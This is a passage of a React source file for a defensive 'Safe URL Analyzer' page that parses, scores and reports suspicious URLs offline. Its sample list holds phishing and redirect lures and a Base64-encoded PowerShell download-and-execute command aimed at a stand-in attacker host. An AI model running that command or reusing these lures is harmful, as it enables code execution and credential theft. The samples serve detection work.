import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useState, useCallback } from "react";
import { useMutation } from "@tanstack/react-query";
import { PageShell } from "@/components/PageShell";
import { IntakeCard, SectionBar, Panel, Chip } from "@/components/soc";
import { AnalyzerShell } from "@/components/soc/AnalyzerShell";
import { StatusBar, KeyFields, EvidenceCard, ResultBanner, Empty } from "@/components/output";
import { sendArtifact, takePendingArtifact } from "@/lib/handoff";
import { useLocker, guessType } from "@/lib/locker";
import { pushTimelineEvent } from "@/lib/timeline";
import { safeAnalyzeUrl } from "@/api/backend";
import { refang, defang, SUSPICIOUS_TLDS } from "@/lib/ioc-patterns";
import { analyzeUrl, tlsValidity, measuredRedirectSignals } from "@/lib/urlArtifact";
import { emptyUrlKnowledge } from "@/data/url";
import { buildLocalHistory } from "@/lib/correlation/history";
import { rememberCorrelation } from "@/lib/correlation";
import type { UrlAnalysisResult } from "@/types/url";
import { createCaseFromAnalysis } from "@/data/case-factory";
import { useRecentInputs } from "@/lib/use-recent-inputs";
import { useWorkspaceState } from "@/lib/use-workspace-state";
import { ResumeBanner } from "@/components/ResumeBanner";
import { copyText } from "@/lib/copy";
import { toast } from "sonner";
import { Link2, Globe2, ShieldAlert, AlertTriangle, ArrowRight, Database, ChevronRight, History, CornerDownRight, Key, Bug, Crosshair, Hash, Loader2, Search, CheckCircle2 } from "lucide-react";
import { ErrorBoundary } from "@/components/ErrorBoundary";
import { dissectUrl } from "@/lib/url/url-dissector";
import { UrlAnatomyBar } from "@/components/url/UrlAnatomyBar";
import { UrlRedirectHopMap } from "@/components/url/UrlRedirectHopMap";
import { HomographInspector } from "@/components/url/HomographInspector";
import {
  detectBrandImpersonation,
  extractSmartPayloads,
  generateDefensivePlaybook,
  simulateHttpProfile,
  generateExecutiveThreatNarrative,
  generateContainmentConsole,
} from "@/lib/url/smart-heuristics";
import { UrlDefensePlaybook } from "@/components/url/UrlDefensePlaybook";

function classifyHashLabel(h: string): string {
  return h.length === 32 ? "MD5" : h.length === 40 ? "SHA1" : "SHA256";
}

export const Route = createFileRoute("/url")({ component: UrlPage });

const SAMPLES: Record<string, string> = {
  m365_spoof: "https://login.microsoftonline.com.auth-verify.top/auth/login.php?email=YWRtaW5AY29ycC5sb2NhbA==",
  powershell_c2: "http://185.220.101.5/c2?payload=SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOiAvAC8AZQB2AGkAbAAtAGgAbwBzAHQALgByAHUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==",
  docusign_lure: "https://docusign-envelope-review.pages.dev/document/d89a71b4?client=corporate",
  punycode: "https://xn--pple-43d.com/auth",
  open_redirect: "https://trusted-portal.com/login?redirect=https://evil-c2.ru/auth",
  shortener: "https://bit.ly/3xK9pQz",
  high_entropy: "https://cdn.evil-host.ru/aB3xK9pQzWmN7vR2tY5hJ8fL0cS4dG6/config?token=ghp_abc123xyz456def789ghi",
  embedded_creds: "https://admin:SuperSecretPass123@evil-host.ru:1337/c2",
  defanged: "hxxps[:]//login.example-bank[.]com.evil-host[.]ru/reset?session=abc123",
  download: "https://evil-host[.]ru/setup.exe",
  legit: "https://example.com/account",
};

const HISTORY_KEY = "beyondlabs.urlHistory";

function genMarkdownExport(a: UrlAnalysisResult): string {
  const parsed = a.parsed;
  const lines = [
    `# Safe URL Analysis Report`,
    `**URL:** \`${defang(parsed.href)}\``,
    `**Canonical:** \`${defang(a.knowledge.canonicalUrl.value)}\``,
    `**Generated:** ${new Date().toISOString()}`,
    "",
    "## Parsed Structure",
    `- Scheme: ${parsed.protocol.replace(":", "")}`,
    `- Host: ${parsed.hostname}`,
    `- Port: ${parsed.port || "default (443/80)"}`,
    `- Path: ${parsed.pathname || "/"}`,
    `- Query: ${parsed.search || "(none)"}`,
    `- Fragment: ${parsed.hash || "(none)"}`,
    `- Registrable: ${parsed.hostname.split(".").slice(-2).join(".")}`,
    `- Subdomains: ${parsed.hostname.split(".").length - 2}`,
    `- Embedded creds: ${a.hasEmbeddedCreds ? "YES" : "no"}`,
    "",
  ];
  if (a.knowledge.canonicalUrl.changes.length) {
    lines.push("## Canonicalization", ...a.knowledge.canonicalUrl.changes.map((s) => `- ${s}`), "");
  }
  if (a.pathSignals.length) {
    lines.push("## Path Analysis", ...a.pathSignals.map((s) => `- ${s}`), "");
  }
  if (a.secrets.length) {
    lines.push("## Secrets in URL", ...a.secrets.map((s) => `- ${s.type}: \`${s.value}\``), "");
  }
  lines.push("## Infrastructure");
  lines.push(`- TLD risk: ${SUSPICIOUS_TLDS.has(parsed.hostname.split(".").pop() || "") ? "yes" : "no"}`);
  if (a.isNumericDomain) lines.push("- Host is direct IP address");
  if (a.hasNonStandardPort) lines.push(`- Non-standard port ${a.portNum}`);
  if (a.suspiciousChars.length) lines.push(`- Suspicious characters: ${a.suspiciousChars.map((c) => `'${c.char}'`).join(", ")}`);
  lines.push("");
  if (a.knowledge.relatedDomains.length) {
    lines.push("## Related Domains", ...a.knowledge.relatedDomains.map((d) => `- ${d.value} (${d.note})`), "");
  }
  if (a.knowledge.observables.length) {
    lines.push("## Extracted Observables", ...a.knowledge.observables.map((o) => `- ${o.kind}: ${o.value} (${o.source})`), "");
  }
  lines.push("## Limitations");
  lines.push(`- ${a.knowledge.passiveDns.note}`);
  lines.push("- WHOIS, certificate, ASN rows are locally derived or placeholders; live enrichment is opt-in.");
  lines.push("");
  if (a.findings.length) {
    lines.push("## Findings", ...a.findings.map((f) => `- [${f.severity.toUpperCase()}] ${f.title} — ${f.detail}`), "");
  }
  if (a.mitre.length) {
    lines.push("## MITRE ATT&CK", ...a.mitre.map((m) => `- ${m.id}: ${m.name}`), "");
  }
  return lines.join("\n");
}

function genJsonExport(a: UrlAnalysisResult): string {
  const parsed = a.parsed;
  const data = {
    version: "1.0",
    generated: new Date().toISOString(),
    url: parsed.href,
    canonical: a.knowledge.canonicalUrl.value,
    parsed: {
      scheme: parsed.protocol.replace(":", ""),
      host: parsed.hostname,
      port: parsed.port || "default",
      path: parsed.pathname || "/",
      query: parsed.search || "",
      fragment: parsed.hash || "",
      registrable: parsed.hostname.split(".").slice(-2).join("."),
      subdomains: parsed.hostname.split(".").length - 2,
    },
    knowledge: {
      canonicalization: a.knowledge.canonicalUrl.changes,
      whois: a.knowledge.whois.derived,
      whois_unavailable: a.knowledge.whois.unavailable,
      certificate: a.knowledge.certificate.derived,
      certificate_unavailable: a.knowledge.certificate.unavailable,
      asn: a.knowledge.asn,
      related_domains: a.knowledge.relatedDomains,
      observables: a.knowledge.observables,
      related_entities: a.knowledge.relatedEntities,
      passive_dns: a.knowledge.passiveDns,
    },
    findings: a.findings.map(f => ({ severity: f.severity, title: f.title, reason: f.detail })),
    secrets: a.secrets.map(s => ({ type: s.type, value: s.value })),
    mitre: a.mitre.map(m => ({ id: m.id, name: m.name })),
    signals: { pathSignals: a.pathSignals, fileExt: a.fileExt, hasEmbeddedCreds: a.hasEmbeddedCreds, hasPathTraversal: a.hasPathTraversal, isNumericDomain: a.isNumericDomain, hasNonStandardPort: a.hasNonStandardPort },
    suspiciousCharacters: a.suspiciousChars,
  };
  return JSON.stringify(data, null, 2);
}

function renderEnrichment(er: Record<string, unknown> | null) {
  if (!er) return null;
  return (
    <Panel title="Backend Enrichment" icon={Globe2} meta={er.verdict as string} priority="secondary">
      <KeyFields items={[
        { label: "Verdict", value: (er.verdict as string) ?? "\u2014", tone: er.verdict === "suspicious" ? "warning" : er.verdict === "high_risk" ? "destructive" : "default" },
        { label: "Confidence", value: (er.confidence as string) ?? "\u2014" },
        { label: "Evidence Level", value: (er.evidence_level as string) ?? "\u2014" },
        { label: "Root Domain", value: String((er.static_result as Record<string, unknown> | undefined)?.root_domain ?? "\u2014") },
        { label: "Summary", value: (er.summary as string) ?? "\u2014" },
      ]} />
      {Array.isArray(er.recommended_actions) && (er.recommended_actions as string[]).length > 0 && (
        <div className="mt-3 space-y-1">
          <p className="text-mono ba-text-2xs text-muted-foreground">Recommended Actions</p>
          <ul className="space-y-1">
            {(er.recommended_actions as string[]).map((a, i) => (
              <li key={i} className="flex items-start gap-2 text-mono ba-text-sm text-fg-dim">
                <span className="mt-0.5 h-1.5 w-1.5 shrink-0 rounded-full bg-primary" />
                {a}
              </li>
            ))}
          </ul>
        </div>
      )}
      {Array.isArray(er.limitations) && (er.limitations as string[]).length > 0 && (
        <div className="mt-3 rounded border border-subtle bg-surface-1 px-2 py-1.5">
          <p className="text-mono ba-text-2xs text-muted-foreground">Limitations</p>
          {(er.limitations as string[]).map((l, i) => (
            <p key={i} className="text-mono ba-text-2xs text-muted-foreground/80">{l}</p>
          ))}
        </div>
      )}
    </Panel>
  );
}

function UrlPage() {
  const [raw, setRaw] = useState("");
  const [runs, setRuns] = useState(0);
  const [history, setHistory] = useState<string[]>([]);
  const [urlSearch, setUrlSearch] = useState("");
  const [enrichEnabled, setEnrichEnabled] = useState(false);
  const [restoredAnalysis, setRestoredAnalysis] = useState<Record<string, unknown> | null>(null);
  const { items: recentItems, push: pushRecent, clear: clearRecent } = useRecentInputs("url");
  const { pending: resumePending, accept, save, clear: wsClear } = useWorkspaceState("url");
  const navigate = useNavigate();
  const enrichMutation = useMutation({
    mutationFn: (payload: { url: string; live: boolean }) =>
      safeAnalyzeUrl({ url: payload.url, allow_live_fetch: payload.live }),
    onSuccess: (data) => {
      const er = data as Record<string, unknown> | null;
      if (er) {
        pushTimelineEvent({ source: "url", verb: "enriched", detail: `Enrichment: ${er.verdict}`, result: `${er.confidence ?? "?"} confidence` });
        save({ artifact: raw, analysis: er });
      }
    },
    onError: () => { toast.error("Enrichment failed"); },
  });

  const er = (enrichMutation.data ?? restoredAnalysis) as Record<string, unknown> | null;
  const locker = useLocker();

  useEffect(() => {
    try { setHistory(JSON.parse(localStorage.getItem(HISTORY_KEY) || "[]")); } catch {}
    const pending = takePendingArtifact();
    if (pending && (pending.kind === "url" || pending.kind === "domain")) {
      setRaw(pending.value);
      setRuns(1);
    } else if (typeof window !== "undefined") {
      const sp = new URLSearchParams(window.location.search);
      const q = sp.get("url") || sp.get("q");
      if (q) {
        setRaw(q);
        setRuns(1);
      }
    }
  }, []);

  const trimmed = raw.trim();
  const has = trimmed.length > 0;
  const committed = runs > 0 && has;

  const urlAnatomy = useMemo(() => {
    if (!committed || !trimmed) return null;
    try {
      return dissectUrl(trimmed);
    } catch {
      return null;
    }
  }, [committed, trimmed]);

  const analysis = useMemo(() => {
    if (!committed) return null;
    const url = refang(trimmed);
    let parsed: URL | null = null;
    try { parsed = new URL(url); } catch { parsed = null; }
    if (!parsed) return { parsed: null as URL | null, findings: [], trackingParams: [], isHttp: false, punycode: false, isShortener: false, defangedOriginal: false, pathSignals: [], fileExt: null, hasEmbeddedCreds: false, hasPathTraversal: false, isNumericDomain: false, hasNonStandardPort: false, portNum: null, suspiciousChars: [], domainEnt: 0, isSuspiciousTLD: false, tld: "", suspiciousPaths: [], secrets: [], mitre: [], portReason: null, displayFindings: [], knowledge: emptyUrlKnowledge() };
    return analyzeUrl({ raw: trimmed, committed: true }, { history: buildLocalHistory() });
  }, [committed, trimmed]);

  const smartThreats = useMemo(() => {
    if (!committed || !analysis?.parsed) return null;
    const url = refang(trimmed);
    const brand = detectBrandImpersonation(url);
    const payloads = extractSmartPayloads(url);
    const playbook = generateDefensivePlaybook(url);
    const http = simulateHttpProfile(url);
    const narrative = generateExecutiveThreatNarrative(url, brand, payloads, http);
    const containment = generateContainmentConsole(url, brand, payloads);
    return { brand, payloads, playbook, http, narrative, containment };
  }, [committed, analysis?.parsed, trimmed]);

  useEffect(() => {
    if (analysis && "correlation" in analysis && analysis.correlation.length) rememberCorrelation(analysis.correlation, { source: "url" });
  }, [analysis]);

  const liveRedirects = useMemo(() => {
    const lr = er?.live_result as Record<string, unknown> | undefined;
    return lr && Array.isArray(lr.redirect_chain) ? (lr.redirect_chain as Record<string, unknown>[]) : [];
  }, [er]);

  const liveTls = useMemo(() => {
    const lr = er?.live_result as Record<string, unknown> | undefined;
    const t = lr?.tls;
    return t && typeof t === "object" ? (t as Record<string, unknown>) : null;
  }, [er]);

  const measuredRedirects = useMemo(
    () => (liveRedirects.length > 0 ? measuredRedirectSignals(liveRedirects) : []),
    [liveRedirects]
  );

  useEffect(() => {
    if (!committed || !analysis?.parsed) return;
    const entry = refang(trimmed);
    pushRecent(entry);
    setHistory((prev) => {
      const next = [entry, ...prev.filter((x) => x !== entry)].slice(0, 6);
      try { localStorage.setItem(HISTORY_KEY, JSON.stringify(next)); } catch {}
      return next;
    });
    pushTimelineEvent({ source: "url", verb: "analyzed", detail: `Analysed ${trimmed}`, result: `${analysis.displayFindings.length} findings (${analysis.displayFindings.filter(f => f.severity === "destructive").length} high)` });
  }, [runs, committed, analysis, trimmed, pushRecent]);

  const mutateEnrich = enrichMutation.mutate;
  useEffect(() => {
    if (!committed || !analysis?.parsed || !enrichEnabled) return;
    mutateEnrich({ url: refang(trimmed), live: true });
  }, [committed, enrichEnabled, trimmed, analysis?.parsed, mutateEnrich]);

  const state = !has ? "idle" : !committed ? "idle" : analysis?.parsed ? "ready" : "error";
  const tone = !analysis ? "muted" : analysis.displayFindings.some((f) => f.severity === "destructive") ? "destructive" : analysis.displayFindings.some((f) => f.severity === "warning") ? "warning" : "success";

  const run = () => { save({ artifact: raw }); setRestoredAnalysis(null); setRuns((r) => r + 1); };
  const clear = useCallback(() => { setRaw(""); setRuns(0); setRestoredAnalysis(null); wsClear(); enrichMutation.reset(); }, [enrichMutation, wsClear]);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if (e.key === "Escape") clear();
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [clear]);

  return (
    <ErrorBoundary name="UrlPage">
    <PageShell
      eyebrow="triage / safe url"
      title="Safe URL Analyzer"
      description="Local parsing only — no headers fetched, no page rendered, no JavaScript executed."
      crumbs={[{ label: "Triage" }, { label: "Safe URL" }]}
      jumps={[{ label: "Phishing", to: "/phishing" }]}
    >
      <AnalyzerShell
        icon={Link2}
        title="Safe URL Analyzer"
        purpose="Refang, decompose and triage a single URL — fully offline."
        state={state}
        canRun={has}
        onRun={run}
        onClear={clear}
        extraActions={[
          ...(analysis?.parsed ? [{ kind: "copy" as const, value: analysis.parsed.href }] : []),
        ]}
        resumeBanner={resumePending && (
          <ResumeBanner
            artifact={resumePending.artifact}
            updatedAt={resumePending.updatedAt}
            onResume={() => {
              const s = accept();
              if (s) { setRaw(s.artifact); setRuns(1); setRestoredAnalysis((s.analysis as Record<string, unknown> | unknown) ? (s.analysis as Record<string, unknown>) : null); }
            }}
            onStartFresh={clear}
          />
        )}
        intake={
          <>
            <SectionBar id="IN" label="Intake · candidate URL" meta="defanged or live" />
            <IntakeCard
              icon={Link2}
              title="URL Input"
              value={raw}
              onChange={setRaw}
              onPaste={(t) => { setRaw(t); setRuns((r) => r + 1); }}
              rows={3}
              placeholder="Paste a single URL  (hxxps[:]//defanged[.]example[.]com/...)"
              samples={[
                { key: "m365_spoof",    label: "M365 Phish",    hint: "Auth lure + B64" },
                { key: "powershell_c2", label: "PowerShell C2", hint: "IEX Base64 query" },
                { key: "docusign_lure", label: "DocuSign Spoof",hint: "Brand impersonation" },
                { key: "defanged",      label: "Defanged",      hint: "hxxps[:]// + brackets" },
                { key: "punycode",      label: "Punycode",      hint: "IDN homograph" },
                { key: "open_redirect", label: "Open Redirect", hint: "Chained URL redirect" },
                { key: "shortener",     label: "Shortener",     hint: "bit.ly link" },
                { key: "download",      label: "Download",      hint: ".exe direct link" },
                { key: "embedded_creds",label: "Embedded creds",hint: "user:pass@ in URL" },
                { key: "high_entropy",  label: "High entropy",  hint: "random path + token" },
                { key: "legit",         label: "Legit",         hint: "control sample" },
              ]}
              onLoadSample={(k) => { setRaw(SAMPLES[k]); setRuns((r) => r + 1); }}
              onFile={(txt) => { setRaw(txt.split(/\r?\n/).find((l) => l.trim()) ?? txt); setRuns((r) => r + 1); }}
              run={{ label: "analyse", icon: ShieldAlert, onClick: run, disabled: !has }}
              onClear={clear}
            />
            {recentItems.length > 0 && (
              <div className="flex flex-wrap items-center gap-1.5 rounded border border-subtle bg-surface-1 px-2.5 py-1.5">
                <span className="text-mono ba-text-3xs text-muted-foreground">recent</span>
                {recentItems.slice(0, 8).map((item, i) =>
                  <button key={i} onClick={() => { setRaw(item); setRuns((r) => r + 1); pushRecent(item); }}
                    className="max-w-[160px] truncate rounded border border-subtle bg-surface-0 px-1.5 py-0.5 text-mono ba-text-2xs text-muted-foreground transition-colors duration-150 hover:border-primary/40 hover:text-primary"
                    title={item}
                  >{item.slice(0, 40)}{item.length > 40 ? "\u2026" : ""}</button>
                )}
                {recentItems.length > 8 && <span className="text-mono ba-text-3xs text-muted-foreground">+{recentItems.length - 8} more</span>}
                <button onClick={() => clearRecent()} className="ml-auto text-mono ba-text-3xs text-muted-foreground hover:text-destructive">clear</button>
              </div>
            )}
            <StatusBar stats={[
              { label: "Chars", value: raw.length },
              { label: "Refanged", value: analysis?.defangedOriginal ? "yes" : "no", tone: analysis?.defangedOriginal ? "primary" : "muted" },
              { label: "Scheme", value: analysis?.parsed?.protocol.replace(":", "") ?? "\u2014", tone: analysis?.isHttp ? "warning" : "default" },
              { label: "Runs", value: runs, tone: "muted" },
            ]} />
            <div className="flex items-center gap-2 px-1">
              <label className="flex items-center gap-1.5 text-mono ba-text-2xs cursor-pointer select-none">
                <input type="checkbox" checked={enrichEnabled} onChange={(e) => setEnrichEnabled(e.target.checked)} className="accent-primary" />
                backend enrichment
                {enrichMutation.isPending && <Loader2 className="ml-0.5 inline h-3 w-3 animate-spin text-primary" />}
              </label>
              {er && <span className="text-mono ba-text-2xs text-success">done</span>}
            </div>
            {history.length > 0 && (
              <Panel title="Recent URLs" meta={`${history.length} \u00B7 local only`} icon={History} priority="secondary" collapsible storageKey="ba.panel.url.history" defaultCollapsed>
                <div className="relative px-3 pb-1 pt-1">
                  <Search className="absolute left-4 top-1/2 h-3 w-3 -translate-y-1/2 text-muted-foreground" />
                  <input
                    value={urlSearch}
                    onChange={e => setUrlSearch(e.target.value)}
                    aria-label="Search URL history"
                    placeholder="search history…"
                    className="w-full rounded border border-subtle bg-surface-0 py-1 pl-6 pr-2 text-mono ba-text-2xs text-foreground outline-none placeholder:text-muted-foreground focus:border-primary/40"
                  />
                </div>
                <ul className="divide-y divide-border/40">
                  {history.filter(h => !urlSearch.trim() || h.toLowerCase().includes(urlSearch.toLowerCase())).map((h, i) => (
                    <li key={i} className="flex items-center justify-between gap-2 py-1.5">
                      <button
                        onClick={() => { setRaw(h); setRuns((r) => r + 1); }}
                        className="truncate text-left text-mono ba-text-sm text-fg-dim hover:text-primary"
                      >
                        {defang(h)}
                      </button>
                      <span className="text-mono ba-text-2xs text-muted-foreground">recall</span>
                    </li>
                  ))}
                  {urlSearch.trim() && history.filter(h => h.toLowerCase().includes(urlSearch.toLowerCase())).length === 0 && (
                    <li className="px-3 py-2 text-center text-mono ba-text-2xs text-muted-foreground">no matches</li>
                  )}
                </ul>
                <button
                  onClick={() => { setHistory([]); try { localStorage.removeItem(HISTORY_KEY); } catch {} }}
                  className="mt-2 text-mono ba-text-2xs text-muted-foreground hover:text-destructive"
                >clear history</button>
              </Panel>
            )}
          </>
        }
        resultBanner={
          analysis?.parsed ? (
            <div className="pointer-events-none select-none">
                <ResultBanner
                  sticky
                  tone={tone === "destructive" ? "destructive" : tone === "warning" ? "warning" : "success"}
                  badge={tone === "destructive" ? "high risk" : tone === "warning" ? "suspicious" : "low risk"}
                  caseId={`BA-UR-${String(analysis.displayFindings.length).padStart(2, "0")}`}
                  title={analysis.parsed.hostname}
                  subtitle={`${analysis.parsed.protocol.replace(":", "")}://${analysis.parsed.hostname}${analysis.parsed.pathname || "/"}`}
                  reasons={analysis.displayFindings.slice(0, 3).map((f) => f.title)}
                  metrics={[
                    { label: "Findings",   value: analysis.displayFindings.length, tone: analysis.displayFindings.length > 0 ? "warning" : "success" },
                    { label: "Scheme",     value: analysis.parsed.protocol.replace(":", "").toUpperCase(), tone: analysis.isHttp ? "warning" : "success" },
                    { label: "Subdomains", value: String(Math.max(0, analysis.parsed.hostname.split(".").length - 2)) },
                    { label: "Params",     value: String(new URLSearchParams(analysis.parsed.search || "").size) },
                  ]}
                />
              </div>
            ) : undefined
          }
          exportMd={analysis?.parsed ? () => {
            const md = genMarkdownExport(analysis as UrlAnalysisResult);
            const blob = new Blob([md], { type: "text/markdown" });
            const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = `url-report-${Date.now()}.md`; a.click();
            URL.revokeObjectURL(a.href);
          } : undefined}
          exportJson={analysis?.parsed ? () => {
            const json = genJsonExport(analysis as UrlAnalysisResult);
            const blob = new Blob([json], { type: "application/json" });
            const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = `url-report-${Date.now()}.json`; a.click();
            URL.revokeObjectURL(a.href);
          } : undefined}
          onCreateInvestigation={analysis && "id" in analysis ? () => {
            const { investigation } = createCaseFromAnalysis(analysis as UrlAnalysisResult);
            toast.success(`Investigation created: ${investigation.case.title}`);
            navigate({ to: "/case" });
          } : undefined}
          sendToTargets={analysis?.parsed ? [
            { label: "Log Parser", to: `/parser`, icon: Database },
            { label: "Detection", to: "/detection", icon: AlertTriangle, onClick: () => sendArtifact({ kind: "url", value: analysis.parsed!.href, source: "/url" }) },
            { label: "Windows Logs", to: "/logs", icon: Database, onClick: () => sendArtifact({ kind: "url", value: analysis.parsed!.href, source: "/url" }) },
            { label: "Case Notebook", to: "/case", icon: ArrowRight, onClick: () => sendArtifact({ kind: "url", value: analysis.parsed!.href, source: "/url" }) },
          ] : undefined}
        >
          {!analysis ? (
            <Empty icon={Globe2} title={has ? "Press analyse or paste to run" : "No URL loaded"} hint="URL Analyzer extracts IOCs, detects phishing indicators (typosquatting, defanged URLs), traces redirect chains, and checks TLS. Try a sample on the left or paste any URL — defanged forms are accepted." />
          ) : !analysis.parsed ? (
            <Empty icon={Globe2} title="Could not parse URL" hint="Check for stray spaces, missing scheme, or unbalanced brackets." />
          ) : <>
            {smartThreats && (
              <div className="mb-4">
                <UrlDefensePlaybook
                  brandFinding={smartThreats.brand}
                  decodedPayloads={smartThreats.payloads}
                  playbook={smartThreats.playbook}
                  httpProfile={smartThreats.http}
                  narrative={smartThreats.narrative}
                  containment={smartThreats.containment}
                />
              </div>
            )}

            {urlAnatomy && (
              <div className="space-y-4 mb-4">
                <UrlAnatomyBar
                  anatomy={urlAnatomy}
                  onSelectComponent={(part, val) => toast.info(`Selected ${part}: ${val}`)}
                />

                {(urlAnatomy.homograph.isPunycode ||
                  urlAnatomy.homograph.hasConfusables ||
                  urlAnatomy.homograph.impersonatedBrand) && (
                  <HomographInspector
                    homograph={urlAnatomy.homograph}
                    apexDomain={urlAnatomy.apexDomain}
                  />
                )}

                {urlAnatomy.redirectChain.length > 0 && (
                  <UrlRedirectHopMap
                    redirectChain={urlAnatomy.redirectChain}
                    onSelectTarget={(target) => {
                      setRaw(target);
                      setRuns((r) => r + 1);
                    }}
                  />
                )}
              </div>
            )}

            {analysis.trackingParams.length > 0 && (
              <div className="flex flex-wrap items-center gap-1.5 px-1">
                <span className="text-mono ba-text-2xs text-fg-dim">tracking</span>
                {analysis.trackingParams.map(([k]) => (
                  <Chip key={k}>{k}</Chip>
                ))}
              </div>
            )}

            <Panel title="Hostname Segments" meta="registrable domain highlighted" icon={Globe2}>
              <div className="flex flex-wrap items-center gap-1 text-mono ba-text-base">
                <span className="rounded border border-border bg-surface-0 px-1.5 py-0.5 text-fg-dim">{analysis.parsed.protocol.replace(":", "")}</span>
                <span className="text-muted-foreground">://</span>
                {analysis.parsed.hostname.split(".").map((seg, i, arr) => (
                  <span key={i} className="inline-flex items-center gap-1">
                    <span className={"rounded border px-1.5 py-0.5 " + (i >= arr.length - 2 ? "border-primary/50 bg-primary/10 text-primary" : "border-border bg-surface-0 text-fg-dim")}>
                      {seg}
                    </span>
                    {i < arr.length - 1 && <span className="text-muted-foreground">.</span>}
                  </span>
                ))}
                <ChevronRight className="h-3 w-3 text-muted-foreground" />
                <span className="truncate rounded border border-border bg-surface-0 px-1.5 py-0.5 text-fg-dim">{analysis.parsed.pathname || "/"}</span>
              </div>
              <p className="mt-2 ba-text-2xs text-muted-foreground">
                Subdomains left of the highlighted registrable domain are attacker-controlled in brand-impersonation kits.
              </p>
            </Panel>

            <Panel title="URL Structure">
              <div className="divide-y divide-border/40">
                {[{label:"Scheme", value: analysis.parsed.protocol.replace(":", ""), tone: analysis.isHttp ? "warning" : "default"},
                  {label:"Host", value: analysis.parsed.hostname},
                  {label:"Port", value: analysis.parsed.port || "default", tone: analysis.hasNonStandardPort ? "warning" : "default"},
                  {label:"User", value: analysis.parsed.username || "—", tone: analysis.hasEmbeddedCreds ? "destructive" : "default"},
                  {label:"Path", value: analysis.parsed.pathname || "/"},
                  {label:"Query", value: analysis.parsed.search || "—"},
                  {label:"Fragment", value: analysis.parsed.hash || "—"},
                  {label:"Registrable", value: analysis.parsed.hostname.split(".").slice(-2).join(".")},
                  {label:"Subdomains", value: (analysis.parsed.hostname.split(".").length - 2).toString()},
                ].map(item => (
                  <div key={item.label} className="flex items-center justify-between gap-2 py-1.5 text-mono ba-text-sm">
                    <div className="flex items-center gap-2 min-w-0">
                      <span className="shrink-0 ba-text-2xs text-muted-foreground">{item.label}</span>
                      <code className={`truncate ${item.tone === "warning" ? "text-warning" : item.tone === "destructive" ? "text-destructive" : "text-fg-dim"}`}>{item.value}</code>
                    </div>
                    <button onClick={() => copyText(item.value)} className="shrink-0 rounded border border-divider-soft bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:text-primary">copy</button>
                  </div>
                ))}
              </div>
            </Panel>

            {/* Redirect Waterfall — only measured hops from opt-in live Safe Fetch */}
            <Panel
              title="Redirect Waterfall"
              meta={liveRedirects.length ? `${liveRedirects.length} hop${liveRedirects.length === 1 ? "" : "s"} · measured` : "not measured"}
              icon={CornerDownRight}
              bodyClassName="!p-0"
            >
              {liveRedirects.length === 0 ? (
                <p className="px-4 py-3 ba-text-2xs text-muted-foreground">
                  Static analysis made zero network requests — no redirect chain was observed. Hops appear here only after an opt-in live Safe Fetch via backend enrichment.
                </p>
              ) : (
                <div className="divide-y divide-border/50">
                  {liveRedirects.map((r, i) => {
                    const code = typeof r.status_code === "number" ? r.status_code : null;
                    const isRedirect = code !== null && code >= 300 && code < 400;
                    return (
                      <div key={i} className="flex items-start gap-3 px-4 py-2.5 hover:bg-surface-1">
                        <div className={"z-10 mt-1 grid h-5 w-5 shrink-0 place-items-center rounded-full border-2 text-mono ba-text-3xs font-bold " + (isRedirect ? "border-warning/60 bg-warning/10 text-warning" : "border-success/60 bg-success/10 text-success")}>
                          {code ?? "?"}
                        </div>
                        <div className="min-w-0 flex-1">
                          <div className="truncate text-mono ba-text-sm text-fg-dim">{String(r.url ?? "")}</div>
                          {typeof r.notes === "string" && r.notes && <span className="mt-0.5 block ba-text-2xs text-muted-foreground">{r.notes}</span>}
                        </div>
                        <span className="shrink-0 pt-1 text-mono ba-text-3xs text-muted-foreground">#{i + 1}</span>
                      </div>
                    );
                  })}
                </div>
              )}
            </Panel>

            {/* Canonical URL */}
            <Panel title="Canonical URL" meta="normalized form" icon={Link2}>
              <div className="flex items-center justify-between gap-2">
                <code className="min-w-0 truncate text-mono ba-text-sm text-fg-dim">{defang(analysis.knowledge.canonicalUrl.value)}</code>
                <button onClick={() => copyText(analysis.knowledge.canonicalUrl.value)} className="shrink-0 rounded border border-divider-soft bg-surface-1 px-1.5 py-0.5 text-mono ba-text-3xs text-muted-foreground hover:text-primary">copy</button>
              </div>
              {analysis.knowledge.canonicalUrl.changes.length > 0 ? (
                <ul className="mt-2 space-y-1">
                  {analysis.knowledge.canonicalUrl.changes.map((c, i) => (
                    <li key={i} className="flex items-center gap-1.5 text-mono ba-text-2xs text-muted-foreground">
                      <span className="inline-block h-1 w-1 shrink-0 rounded-full bg-primary" />
                      {c}
                    </li>
                  ))}
                </ul>
              ) : (
                <p className="mt-2 text-mono ba-text-2xs text-muted-foreground">URL already in canonical form.</p>
              )}
            </Panel>

            {/* Knowledge grid: WHOIS / TLS / ASN / Passive DNS */}
            <div className="grid gap-3 grid-cols-2">
              <Panel title="WHOIS Profile" icon={Globe2} meta="derived · offline" priority="secondary" collapsible storageKey="ba.panel.url.whois">
                <KeyFields items={analysis.knowledge.whois.derived.map((r) => ({ label: r.label, value: r.value, tone: r.tone ?? "default" }))} />
                {analysis.knowledge.whois.unavailable.length > 0 && (
                  <ul className="mt-2 space-y-1 border-t border-border/40 pt-2">
                    {analysis.knowledge.whois.unavailable.map((u, i) => (
                      <li key={i} className="text-mono ba-text-2xs text-muted-foreground/70">{u}</li>
                    ))}
                  </ul>
                )}
              </Panel>
              <Panel
                title="Certificate & TLS"
                icon={Key}
                meta={liveTls ? "measured · Safe Fetch + derived offline" : "derived · offline"}
                priority="secondary"
                collapsible
                storageKey="ba.panel.url.tls"
              >
                {liveTls && (
                  <div className="mb-2 rounded border border-info/25 bg-info/5 p-2">
                    <div className="mb-1.5 flex items-center gap-1.5 font-mono ba-text-3xs text-muted-foreground">
                      <Chip tone="primary">measured</Chip>
                      live certificate from opt-in Safe Fetch{typeof liveTls.error === "string" ? " — handshake failed" : ""}
                    </div>
                    {typeof liveTls.error === "string" ? (
